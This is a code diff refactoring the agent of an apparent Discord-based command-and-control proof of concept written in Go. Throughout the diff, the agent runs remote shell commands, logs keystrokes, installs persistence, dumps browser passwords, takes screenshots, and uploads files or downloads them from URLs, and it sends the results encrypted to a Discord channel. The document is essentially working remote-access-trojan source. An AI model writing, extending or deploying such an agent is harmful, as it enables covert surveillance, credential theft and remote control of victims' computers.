@@ -14,8 +14,8 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	"unsafe"
 
+	"discord-c2-poc/cmd/agent/platforms"
 	"discord-c2-poc/pkg/utils"
 
 	"github.com/bwmarrin/discordgo"
@@ -29,6 +29,7 @@ var (
 	ResultChannel  string
 	KeyString      string
 	EncryptionKey  []byte
+	platform       platforms.Platform
 )
 
 // Load config from flags or .env
@@ -61,12 +62,10 @@ func init() {
 }
 
 func main() {
-	// Ensure single instance
-	if runtime.GOOS == "windows" {
-		_, err := createMutex("Global\\DiscordC2AgentMutex")
-		if err != nil {
-			return
-		}
+	// Instantiate the platform-specific implementation
+	platform = platforms.NewPlatform()
+	if err := platform.Init(); err != nil {
+		return // Mutex lock failed
 	}
 
 	dg, err := discordgo.New("Bot " + Token)
@@ -89,9 +88,7 @@ func main() {
 	checkInMsg := fmt.Sprintf("[%s] Agent Online (%s)", hostname, runtime.GOOS)
 	sendEncryptedChunk(dg, ResultChannel, []byte(checkInMsg), EncryptionKey)
 
-	if runtime.GOOS == "windows" {
-		go startKeylogger()
-	}
+	platform.StartKeylogger()
 
 	// Heartbeat every 30s
 	go func() {
@@ -115,30 +112,43 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		return
 	}
 
-	if strings.HasPrefix(m.Content, "!exec ") {
-		rawCommand := strings.TrimPrefix(m.Content, "!exec ")
+	// Simplified command parsing
+	parts := strings.Fields(m.Content)
+	if len(parts) == 0 {
+		return
+	}
+	commandName := parts[0]
 
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-		command := rawCommand
+	// Default target is ALL
+	target := "ALL"
+	myHostname, _ := os.Hostname()
 
-		if strings.HasPrefix(rawCommand, "[") && strings.Contains(rawCommand, "] ") {
-			end := strings.Index(rawCommand, "] ")
-			target = rawCommand[1:end]
-			command = rawCommand[end+2:]
-		}
+	// Generic command parsing for target
+	// Example: !command [target] arg1 arg2
+	var commandArgs string
+	contentWithoutCmd := strings.TrimPrefix(m.Content, commandName)
+	contentWithoutCmd = strings.TrimSpace(contentWithoutCmd)
 
-		if target != "ALL" && target != myHostname {
-			return
-		}
+	if strings.HasPrefix(contentWithoutCmd, "[") && strings.Contains(contentWithoutCmd, "]") {
+		endIndex := strings.Index(contentWithoutCmd, "]")
+		target = contentWithoutCmd[1:endIndex]
+		commandArgs = strings.TrimSpace(contentWithoutCmd[endIndex+1:])
+	} else {
+		commandArgs = contentWithoutCmd
+	}
 
-		log.Printf("[*] Executing command: %s", command)
+	if target != "ALL" && target != myHostname {
+		return
+	}
 
+	switch commandName {
+	case "!exec":
+		log.Printf("[*] Executing command: %s", commandArgs)
 		var output []byte
 		var err error
 
-		if strings.HasPrefix(command, "cd ") {
-			newDir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
+		if strings.HasPrefix(commandArgs, "cd ") {
+			newDir := strings.TrimSpace(strings.TrimPrefix(commandArgs, "cd "))
 			err = os.Chdir(newDir)
 			if err != nil {
 				output = []byte(fmt.Sprintf("Error changing directory: %v", err))
@@ -147,69 +157,19 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 				output = []byte(fmt.Sprintf("Changed directory to: %s", wd))
 			}
 		} else {
-			output, err = executeCommand(command)
+			output, err = platform.ExecuteCommand(commandArgs) // Using platform interface
 			if err != nil {
 				output = []byte(fmt.Sprintf("Error executing command: %v", err))
 			}
 		}
 
 		hostname, _ := os.Hostname()
-		output = append([]byte(fmt.Sprintf("[%s]\n", hostname)), output...)
+		fullOutput := append([]byte(fmt.Sprintf("[%s]\n", hostname)), output...)
+		sendChunkedMessage(s, ResultChannel, fullOutput)
 
-		// Split output to fit Discord 2000 char limit
-		const maxChunkSize = 1400
-
-		if len(output) <= maxChunkSize {
-			sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)
-		} else {
-			for i := 0; i < len(output); i += maxChunkSize {
-				end := i + maxChunkSize
-				if end > len(output) {
-					end = len(output)
-				}
-
-				chunk := output[i:end]
-				sendEncryptedChunk(s, ResultChannel, chunk, EncryptionKey)
-			}
-		}
-	} else if strings.HasPrefix(m.Content, "!keys") {
-		rawCommand := strings.TrimPrefix(m.Content, "!keys")
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end]
-		}
-
-		if target != "ALL" && target != myHostname {
-			return
-		}
-
-		logs := getKeylogs()
-		if logs == "" {
-			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No keystrokes recorded.", myHostname)), EncryptionKey)
-		} else {
-			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Keystrokes:\n%s", myHostname, logs)), EncryptionKey)
-		}
-
-	} else if strings.HasPrefix(m.Content, "!persist") {
-		rawCommand := strings.TrimPrefix(m.Content, "!persist")
-
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end]
-		}
-
-		if target != "ALL" && target != myHostname {
-			return
-		}
-
+	case "!persist":
 		log.Println("[*] Installing persistence...")
-		msg, err := installPersistence()
+		msg, err := platform.InstallPersistence() // Using platform interface
 		if err != nil {
 			msg = fmt.Sprintf("Persistence failed: %v", err)
 		}
@@ -217,22 +177,8 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		output := []byte(fmt.Sprintf("[%s] %s", myHostname, msg))
 		sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)
 
-	} else if strings.HasPrefix(m.Content, "!download") {
-		rawCommand := strings.TrimPrefix(m.Content, "!download")
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-		path := strings.TrimSpace(rawCommand)
-
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "] ") {
-			end := strings.Index(rawCommand, "] ")
-			target = rawCommand[2:end]
-			path = strings.TrimSpace(rawCommand[end+2:])
-		}
-
-		if target != "ALL" && target != myHostname {
-			return
-		}
-
+	case "!download":
+		path := commandArgs
 		log.Printf("[*] Uploading file to Discord: %s", path)
 
 		file, err := os.Open(path)
@@ -250,26 +196,8 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error sending file: %v", myHostname, err)), EncryptionKey)
 		}
 
-	} else if strings.HasPrefix(m.Content, "!upload") {
-		rawCommand := strings.TrimPrefix(m.Content, "!upload")
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-		url := ""
-
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end]
-			if len(rawCommand) > end+1 {
-				url = strings.TrimSpace(rawCommand[end+1:])
-			}
-		} else {
-			url = strings.TrimSpace(rawCommand)
-		}
-
-		if target != "ALL" && target != myHostname {
-			return
-		}
-
+	case "!upload":
+		url := commandArgs
 		if url != "" && (strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")) {
 			log.Printf("[*] Downloading from URL: %s", url)
 			resp, err := http.Get(url)
@@ -321,22 +249,50 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Attachment saved: %s", myHostname, att.Filename)), EncryptionKey)
 			}
 		}
-	} else if strings.HasPrefix(m.Content, "!dumppass") {
-		rawCommand := strings.TrimPrefix(m.Content, "!dumppass")
-		myHostname, _ := os.Hostname()
-		target := "ALL"
 
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end]
-		}
+	case "!screenshot":
+		log.Println("[*] Taking screenshot...")
 
-		if target != "ALL" && target != myHostname {
+		n := screenshot.NumActiveDisplays()
+		if n <= 0 {
+			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No active displays found.", myHostname)), EncryptionKey)
 			return
 		}
 
+		bounds := screenshot.GetDisplayBounds(0)
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			log.Printf("Error capturing screen: %v", err)
+			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error capturing screen: %v", myHostname, err)), EncryptionKey)
+			return
+		}
+
+		var buf bytes.Buffer
+		err = png.Encode(&buf, img)
+		if err != nil {
+			log.Printf("Error encoding PNG: %v", err)
+			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error encoding screenshot: %v", myHostname, err)), EncryptionKey)
+			return
+		}
+
+		fileName := fmt.Sprintf("screenshot_%s.png", myHostname)
+
+		_, err = s.ChannelFileSend(ResultChannel, fileName, &buf)
+		if err != nil {
+			log.Printf("Error sending screenshot: %v", err)
+		}
+
+	case "!keys":
+		logs := platform.GetKeylogs()
+		if logs == "" {
+			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No keystrokes recorded.", myHostname)), EncryptionKey)
+		} else {
+			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Keystrokes:\n%s", myHostname, logs)), EncryptionKey)
+		}
+
+	case "!dumppass":
 		log.Println("[*] Dumping passwords...")
-		passwords := DumpBrowsers()
+		passwords := platform.DumpBrowsers()
 
 		if len(passwords) > 0 {
 			reader := strings.NewReader(passwords)
@@ -348,49 +304,22 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		} else {
 			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No passwords found.", myHostname)), EncryptionKey)
 		}
+	}
+}
 
-	} else if strings.HasPrefix(m.Content, "!screenshot") {
-		rawCommand := strings.TrimPrefix(m.Content, "!screenshot")
+func sendChunkedMessage(s *discordgo.Session, channelID string, data []byte) {
+	const maxChunkSize = 1400 // Keep it safe for encryption overhead
 
-		myHostname, _ := os.Hostname()
-		target := "ALL"
-
-		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end]
-		}
-
-		if target != "ALL" && target != myHostname {
-			return
-		}
-
-		log.Println("[*] Taking screenshot...")
-
-		n := screenshot.NumActiveDisplays()
-		if n <= 0 {
-			return
-		}
-
-		bounds := screenshot.GetDisplayBounds(0)
-		img, err := screenshot.CaptureRect(bounds)
-		if err != nil {
-			log.Printf("Error capturing screen: %v", err)
-			return
-		}
-
-		var buf bytes.Buffer
-		err = png.Encode(&buf, img)
-		if err != nil {
-			log.Printf("Error encoding PNG: %v", err)
-			return
-		}
-
-		hostname, _ := os.Hostname()
-		fileName := fmt.Sprintf("screenshot_%s.png", hostname)
-
-		_, err = s.ChannelFileSend(ResultChannel, fileName, &buf)
-		if err != nil {
-			log.Printf("Error sending screenshot: %v", err)
+	if len(data) <= maxChunkSize {
+		sendEncryptedChunk(s, channelID, data, EncryptionKey)
+	} else {
+		for i := 0; i < len(data); i += maxChunkSize {
+			end := i + maxChunkSize
+			if end > len(data) {
+				end = len(data)
+			}
+			chunk := data[i:end]
+			sendEncryptedChunk(s, channelID, chunk, EncryptionKey)
 		}
 	}
 }
@@ -406,27 +335,4 @@ func sendEncryptedChunk(s *discordgo.Session, channelID string, data []byte, key
 	if err != nil {
 		log.Printf("Error sending chunk: %v", err)
 	}
-}
-
-// installPersistence is now defined in exec_windows.go and exec_unix.go
-
-var (
-	kernel32        = syscall.NewLazyDLL("kernel32.dll")
-	procCreateMutex = kernel32.NewProc("CreateMutexW")
-)
-
-func createMutex(name string) (uintptr, error) {
-	namePtr, _ := syscall.UTF16PtrFromString(name)
-	ret, _, err := procCreateMutex.Call(
-		0,
-		0,
-		uintptr(unsafe.Pointer(namePtr)),
-	)
-	if ret == 0 {
-		return 0, err
-	}
-	if err == syscall.Errno(183) { // ERROR_ALREADY_EXISTS
-		return 0, fmt.Errorf("already exists")
-	}
-	return ret, nil
 }
